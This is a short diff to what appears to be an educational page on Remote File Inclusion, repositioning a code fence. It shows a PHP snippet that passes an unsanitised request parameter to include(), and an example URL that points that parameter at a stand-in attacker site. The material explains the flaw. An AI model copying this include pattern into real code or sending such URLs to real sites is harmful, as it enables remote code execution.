@@ -44,6 +44,7 @@ Since RFI occurs when paths passed to "include" statements are not properly sani
 ```
 $incfile = $_REQUEST["file"];
 include($incfile.".php");
-In this example the path is extracted from the HTTP request and no input validation is done.
-http://vulnerableWebSite.com/vulnPage.php?file=http://attackerSite/malicousURL
 ```
+In this example the path is extracted from the HTTP request and no input validation is done.
+```http://vulnerableWebSite.com/vulnPage.php?file=http://attackerSite/malicousURL```
+
